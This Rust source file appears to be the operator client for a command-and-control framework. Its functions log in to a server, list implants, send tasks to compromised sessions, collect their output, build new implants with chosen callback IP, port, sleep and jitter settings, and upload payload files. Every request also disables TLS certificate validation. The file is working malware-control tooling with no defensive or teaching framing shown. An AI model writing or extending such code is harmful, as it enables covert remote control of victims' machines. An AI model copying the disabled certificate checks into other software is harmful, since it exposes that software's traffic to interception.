use reqwest::{header::{HeaderMap, HeaderName, HeaderValue}, ClientBuilder};
use base64::{engine::general_purpose, Engine as _};
use crate::models::ImpInfo;

pub async fn authenticate(url: &str, username: &str, password: &str) -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
    let url = format!("https://{}/authenticate", url);
    let client = ClientBuilder::new()
        .danger_accept_invalid_certs(true)
        .build()?;
    let up64 = general_purpose::STANDARD.encode(format!("{}:{}", username, password));
    let auth = format!("Basic {}", up64);
    let res = client.post(&url).header("Authorization", auth).send().await?;
    if res.status().is_success() {
        Ok(res.text().await?.trim().to_string())
    } else {
        Err(format!("Login failed: {}", res.status()).into())
    }
}

pub async fn fetch_imps(url: &str, token: &str) -> Result<Vec<ImpInfo>, Box<dyn std::error::Error + Send + Sync>> {
    let url = format!("https://{}/imps", url);
    let client = ClientBuilder::new().danger_accept_invalid_certs(true).build()?;
    let res = client.get(url).header("X-Token", token).send().await?;
    if res.status().is_success() {
        let body = res.text().await?;
        // Mirror TUI behavior: deserialize directly into Vec<ImpInfo>.
        // Server returns JSON array of 9-element sequences in correct field order.
        let imps: Vec<ImpInfo> = serde_json::from_str(&body)?;
        Ok(imps)
    } else {
        Err(format!("Failed to retrieve imp info: {}", res.status()).into())
    }
}

pub async fn issue_task(url: &str, token: &str, session_id: &str, task: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let url = format!("https://{}/issue_task", url);
    let client = ClientBuilder::new().danger_accept_invalid_certs(true).build()?;
    let mut headers = HeaderMap::new();
    headers.insert(HeaderName::from_static("x-token"), HeaderValue::from_str(token)?);
    headers.insert(HeaderName::from_static("x-session"), HeaderValue::from_str(session_id)?);
    headers.insert(HeaderName::from_static("x-task"), HeaderValue::from_str(task)?);
    let res = client.post(&url).headers(headers).send().await?;
    if res.status().is_success() { Ok(()) } else { Err("Failed to issue task".into()) }
}

pub async fn retrieve_all_out(url: &str, token: &str) -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
    let url = format!("https://{}/retrieve_all_out", url);
    let client = ClientBuilder::new().danger_accept_invalid_certs(true).build()?;
    let mut headers = HeaderMap::new();
    headers.insert(HeaderName::from_static("x-token"), HeaderValue::from_str(token)?);
    let res = client.get(&url).headers(headers).send().await?;
    Ok(res.text().await?)
}

pub async fn build_imp(url: &str, token: &str, target: &str, target_ip: &str, target_port: &str, tsleep: &str, format: &str, jitter: &str) -> Result<Vec<u8>, Box<dyn std::error::Error + Send + Sync>> {
    let url = format!("https://{}/build_imp", url);
    let client = ClientBuilder::new().danger_accept_invalid_certs(true).build()?;
    let mut headers = HeaderMap::new();
    headers.insert(HeaderName::from_static("x-token"), HeaderValue::from_str(token)?);
    headers.insert(HeaderName::from_static("x-target"), HeaderValue::from_str(target)?);
    headers.insert(HeaderName::from_static("x-target-ip"), HeaderValue::from_str(target_ip)?);
    headers.insert(HeaderName::from_static("x-target-port"), HeaderValue::from_str(target_port)?);
    headers.insert(HeaderName::from_static("x-tsleep"), HeaderValue::from_str(tsleep)?);
    headers.insert(HeaderName::from_static("x-format"), HeaderValue::from_str(format)?);
    headers.insert(HeaderName::from_static("x-jitter"), HeaderValue::from_str(jitter)?);
    let res = client.post(&url).headers(headers).send().await?;
    if !res.status().is_success() { return Err(format!("Server returned error: {}", res.status()).into()); }
    let bytes = res.bytes().await?;
    Ok(bytes.to_vec())
}

pub async fn bofload(url: &str, token: &str, filename: &str, bytes: Vec<u8>) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use reqwest::header::{CONTENT_TYPE, USER_AGENT};
    let url = format!("https://{}/bofload", url);
    let client = ClientBuilder::new().danger_accept_invalid_certs(true).build()?;
    let mut headers = HeaderMap::new();
    headers.insert("X-Filename", HeaderValue::from_str(filename)?);
    headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/octet-stream"));
    headers.insert(USER_AGENT, HeaderValue::from_static("reqwest"));
    headers.insert("X-Token", HeaderValue::from_str(token)?);
    let res = client.post(url).headers(headers).body(bytes).send().await?;
    if res.status().is_success() { Ok(()) } else { Err(format!("Upload failed: {}", res.status()).into()) }
}


